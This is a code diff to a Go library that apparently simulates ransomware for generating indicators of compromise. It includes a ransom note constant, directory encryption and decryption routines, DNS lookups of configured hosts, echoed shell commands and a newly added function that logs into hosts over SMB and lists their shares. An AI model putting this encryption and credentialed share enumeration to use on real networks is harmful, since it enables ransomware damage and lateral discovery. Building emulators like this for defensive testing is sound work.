@@ -2,6 +2,7 @@ package cjlib
 
 import (
     b64 "encoding/base64"
+	crand "crypto/rand"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rsa"
@@ -14,19 +15,23 @@ import (
 	"io/ioutil"
 	"log"
 	"math/rand"
+    "net"
     "net/http"
 	"os"
 	"path"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strings"
     "sync"
 	"time"
-	crand "crypto/rand"
+
     "gopkg.in/yaml.v3"
 	"github.com/360EntSecGroup-Skylar/excelize"
 	"github.com/brianvoe/gofakeit"
 	"github.com/jung-kurt/gofpdf"
+    "github.com/hirochachacha/go-smb2"
+    //"github.com/seancfoley/ipaddress-go/ipaddr"
 )
 
 const RANSOM_NOTE_FILE = "__RansomNote__.html"
@@ -43,6 +48,7 @@ var WORDLIST []string = strings.Split(WORDS, "\n")
 type YAML_CONFIG struct {
     Api_calls []string
     Command []string
+    Domain []string
     Filename []string
     Exclude []string
     Drop_file struct {
@@ -53,11 +59,12 @@ type YAML_CONFIG struct {
     File_size_min string
     File_size_max string
     Ransom_note string
+    Ip []string
     Registry_keys []struct {
         Key string
         Value string
     }
-    Web_requests []string
+    Web_request []string
 }
 
 func ReadYamlConfig(filename string) (YAML_CONFIG, error) {
@@ -81,7 +88,9 @@ func xorstr(buf []byte, k []byte) []byte {
 }
 
 func Request_IOC_Commands(config YAML_CONFIG) {
-    //wg := sync.WaitGroup{}
+    fmt.Println("[*] =========================")
+    fmt.Println("[*]  Commands IOC Generation")
+    fmt.Println("[*] =========================")
     var wg sync.WaitGroup
     ch := make(chan string)
     wg.Add(len(config.Command))
@@ -99,12 +108,48 @@ func Request_IOC_Commands(config YAML_CONFIG) {
     }
 }
 
+func Request_IOC_DNS(config YAML_CONFIG) {
+    fmt.Println("[*] ====================")
+    fmt.Println("[*]  DNS IOC Generation")
+    fmt.Println("[*] ====================")
+
+    // extract domains from Web Requests
+    rexp := regexp.MustCompile(`https?://([A-Za-z0-9\.\-]+)(:\d{1,5})?/`)
+    ipexp := regexp.MustCompile(`^[\d\.]{7,15}$`)
+
+    var domains []string
+    for _, url := range config.Web_request {
+        matches := rexp.FindStringSubmatch(url)
+        //fmt.Printf("[%s] match count = %d\n", url, len(matches))
+        if len(matches) > 0 {
+            domains = append(domains, matches[1])
+        }
+    }
+    // variadic arc helps us here
+    domains = append(domains, config.Domain...)
+    domains = append(domains, config.Ip...)
+    for i, h := range domains {
+        var err error
+        var addrs []string
+        if ipexp.MatchString(h) {
+            addrs, err = net.LookupAddr(h)
+        } else {
+            addrs, err = net.LookupHost(h)
+        }
+        if err == nil {
+            fmt.Printf("[+] %03d: DNS Lookup of [%s] => %s\n", i, h, addrs)
+        } else {
+            fmt.Printf("[-] %03d: %s\n", i, err.Error())
+        }
+    }
+}
+
 func Request_IOC_HTTP(config YAML_CONFIG) {
     var wg sync.WaitGroup
     ch := make(chan string)
-    wg.Add(len(config.Web_requests))
-    fmt.Printf("[*] Sending %d HTTP Requests\n", len(config.Web_requests))
-    for _, u := range config.Web_requests {
+    wg.Add(len(config.Web_request))
+    fmt.Printf("[*] Sending %d HTTP Requests\n", len(config.Web_request))
+    for _, u := range config.Web_request {
         go HTTPRequest(u, ch, &wg)
     }
     go func() {
@@ -121,7 +166,6 @@ func Request_IOC_HTTP(config YAML_CONFIG) {
 func OSCmd(cmd string, ch chan<-string, wg *sync.WaitGroup) {
     defer wg.Done()
     command := fmt.Sprintf("echo %s", cmd)
-
     shell := ""
     arg1 := ""
     switch runtime.GOOS {
@@ -227,7 +271,7 @@ func EncryptDirectoryStructure(
 
     for m := range(ch) {
         temp := strings.Split(m, ":::")
-        fmt.Printf("ENCRYPTED [%d/%d]: %s\n", encrypted, totalfiles, temp[0])
+        fmt.Printf("[+] ENCRYPTED [%d/%d]: %s\n", encrypted, totalfiles, temp[0])
         InsertFilePathHash(dbh, temp[0], temp[1])
         encrypted++
     }
@@ -314,7 +358,7 @@ func DecryptDirectoryStructure(startdir string, ext string, norename bool, dryru
         temp := strings.Split(m, ":::")
         file := temp[0]
         sha256hash := temp[1]
-        fmt.Printf("DECRYPTED [%d/%d]: %s", decrypted, totalfiles, file)
+        fmt.Printf("[+] DECRYPTED [%d/%d]: %s", decrypted, totalfiles, file)
         db_sha256hash := GetFilePathHash(dbh, file[:len(file)-len(filepath.Ext(file))])
         if len(db_sha256hash) == 0 {
             fmt.Println(" (Hash Not Found)")
@@ -636,3 +680,36 @@ func fetchDecryptKey(rootDir string) [32]byte {
 	copy(aesKey[:], tKey)
 	return aesKey
 }
+
+
+func EnumerateShares(username string, password string, host string, wg *sync.WaitGroup) error {
+    defer wg.Done()
+    host_and_port := fmt.Sprintf("%s:%d", host, 445)
+    conn, err := net.DialTimeout("tcp", host_and_port, time.Second * 5)
+    if err != nil {
+        fmt.Println(err.Error())
+        return err
+    }
+    defer conn.Close()
+
+    d := &smb2.Dialer{
+        Initiator: &smb2.NTLMInitiator{
+            User: username,
+            Password: password,
+        },
+    }
+    s, err := d.Dial(conn)
+    if err != nil {
+        fmt.Println(err.Error())
+        return err
+    }
+    defer s.Logoff()
+
+    names, err := s.ListSharenames()
+    if err != nil { return err }
+    for _, name := range names {
+        fmt.Printf("\\\\%s\\%s\n", host, name)
+    }
+    return nil
+}
+
